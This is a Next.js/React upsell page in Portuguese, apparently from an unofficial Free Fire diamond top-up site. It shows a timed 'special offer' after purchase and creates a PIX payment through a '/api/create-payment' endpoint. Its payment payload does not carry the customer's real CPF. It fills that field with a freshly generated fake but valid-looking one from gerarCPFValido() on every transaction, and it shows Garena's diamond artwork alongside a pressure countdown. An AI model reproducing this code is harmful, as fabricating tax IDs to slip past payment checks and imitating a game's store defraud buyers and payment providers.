'use client';

import { useState, useEffect } from 'react';
import { useRouter } from 'next/navigation';
import Image from 'next/image';
import { Button } from '@/components/ui/button';
import { Header } from '@/components/freefire/Header';
import { Footer } from '@/components/freefire/Footer';
import { cn } from '@/lib/utils';
import { upsellOffers } from '@/lib/data';
import { useToast } from '@/hooks/use-toast';
import { PaymentPayload, ProductData } from '@/interfaces/types';
import { gerarCPFValido } from '@/lib/utils';

// Tipos para os dados do cliente e do produto
interface CustomerData {
    name: string;
    email: string;
    phone: string;
}

const UpsellPage = () => {
    const router = useRouter();
    const { toast } = useToast();
    const [selectedOfferId, setSelectedOfferId] = useState<string | null>(upsellOffers[0]?.id || null);
    const [timeLeft, setTimeLeft] = useState(300); // 5 minutos em segundos
    const [isSubmitting, setIsSubmitting] = useState(false);

    useEffect(() => {
        const timer = setInterval(() => {
            setTimeLeft(prevTime => {
                if (prevTime <= 1) {
                    clearInterval(timer);
                    router.push('/success'); // Se o tempo acabar, vai para a página de sucesso
                    return 0;
                }
                return prevTime - 1;
            });
        }, 1000);

        return () => clearInterval(timer);
    }, [router]);

    const formatTime = (seconds: number) => {
        const minutes = Math.floor(seconds / 60);
        const remainingSeconds = seconds % 60;
        return `${minutes.toString().padStart(2, '0')}:${remainingSeconds.toString().padStart(2, '0')}`;
    };

    const handleDecline = () => {
        // Limpa os dados do cliente se ele recusar a oferta
        localStorage.removeItem('customerData');
        router.push('/success');
    };

    const handlePurchase = async () => {
        if (!selectedOfferId) {
            toast({
                variant: 'destructive',
                title: 'Erro',
                description: 'Por favor, selecione uma oferta para continuar.',
            });
            return;
        }

        setIsSubmitting(true);

        const selectedProduct = upsellOffers.find(p => p.id === selectedOfferId);
        if (!selectedProduct) {
            setIsSubmitting(false);
            return;
        }

        const customerDataString = localStorage.getItem('customerData');
        const playerName = localStorage.getItem('playerName') || 'Desconhecido';
        
        if (!customerDataString) {
            toast({
                variant: "destructive",
                title: "Erro",
                description: "Dados do cliente não encontrados. Por favor, reinicie a compra.",
            });
            setIsSubmitting(false);
            router.push('/');
            return;
        }

        try {
            const customerData: CustomerData = JSON.parse(customerDataString);
            const utmQuery = new URLSearchParams(window.location.search).toString();
            const currentBaseUrl = window.location.origin;

            const payload: PaymentPayload = {
                name: customerData.name,
                email: customerData.email,
                phone: customerData.phone.replace(/\D/g, ''),
                cpf: gerarCPFValido().replace(/\D/g, ''), // Gera um novo CPF para a transação
                paymentMethod: "PIX",
                amount: parseFloat(selectedProduct.price),
                externalId: `ff-upsell1-${Date.now()}`,
                items: [{
                    id: selectedProduct.id,
                    title: selectedProduct.name,
                    unitPrice: parseFloat(selectedProduct.price),
                    quantity: 1,
                    tangible: false
                }],
                postbackUrl: `${currentBaseUrl}/api/ghostpay-webhook`,
                utmQuery,
                traceable: true,
            };

            const response = await fetch("/api/create-payment", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(payload),
            });

            const data = await response.json();

            if (!response.ok) {
                throw new Error(data.message || "Erro ao criar o pagamento para o upsell.");
            }
            
            // Salva os novos dados de pagamento do upsell
            localStorage.setItem('paymentData', JSON.stringify({
                ...data,
                playerName: playerName,
                productDescription: selectedProduct.name,
                amount: selectedProduct.formattedPrice,
                diamonds: selectedProduct.totalAmount,
                originalAmount: selectedProduct.originalAmount,
                bonusAmount: selectedProduct.bonusAmount,
                totalAmount: selectedProduct.totalAmount,
                productId: selectedProduct.id,
            }));
            
            router.push('/buy');

        } catch (error: any) {
            toast({
                variant: "destructive",
                title: "Erro no Pagamento",
                description: error.message,
            });
            setIsSubmitting(false);
        }
    };

    return (
        <div className="flex flex-col min-h-screen bg-white">
            <Header />
            <main className="flex-1 flex flex-col items-center justify-center p-4 text-center bg-gray-50">
                <div className="bg-white rounded-2xl shadow-lg p-6 md:p-10 max-w-lg w-full border">
                    <h1 className="text-2xl md:text-3xl font-bold text-gray-800 uppercase tracking-wider">
                        Espere! Oferta Especial!
                    </h1>
                    <p className="mt-3 text-base text-gray-600">
                        Sua compra foi aprovada! Antes de prosseguir, aproveite esta oferta exclusiva por tempo limitado.
                    </p>
                    
                    <div className="my-6">
                        <p className="text-sm uppercase font-semibold text-gray-500">A oferta termina em:</p>
                        <div className="text-5xl font-bold text-destructive mt-1">{formatTime(timeLeft)}</div>
                    </div>

                    <div className="flex flex-col gap-4 my-8">
                        {upsellOffers.map(offer => (
                            <div
                                key={offer.id}
                                onClick={() => setSelectedOfferId(offer.id)}
                                className={cn(
                                    "p-4 rounded-lg border-2 cursor-pointer transition-all duration-200 text-left flex items-center gap-4",
                                    selectedOfferId === offer.id ? 'border-destructive bg-destructive/5' : 'border-gray-200 bg-white hover:border-gray-300'
                                )}
                            >
                                <div className="flex-shrink-0">
                                    <Image src="https://cdn-gop.garenanow.com/gop/app/0000/100/067/point.png" alt="Diamante" width={40} height={40} data-ai-hint="diamond gem" />
                                </div>
                                <div>
                                    <h2 className="text-lg font-bold text-gray-800">{offer.name}</h2>
                                    <p className="text-2xl font-extrabold text-gray-900">{offer.formattedPrice}</p>
                                </div>
                            </div>
                        ))}
                    </div>

                    <div className="flex flex-col gap-3">
                        <Button
                            onClick={handlePurchase}
                            disabled={!selectedOfferId || isSubmitting}
                            className="w-full text-lg py-6 font-bold"
                            variant="destructive"
                        >
                            {isSubmitting ? 'Processando...' : 'Sim, Eu Quero Esta Oferta!'}
                        </Button>
                        <Button
                            onClick={handleDecline}
                            variant="link"
                            className="text-gray-500 hover:text-gray-700"
                        >
                            Não, obrigado. Leve-me para a confirmação.
                        </Button>
                    </div>
                </div>
            </main>
            <Footer />
        </div>
    );
};

export default UpsellPage;
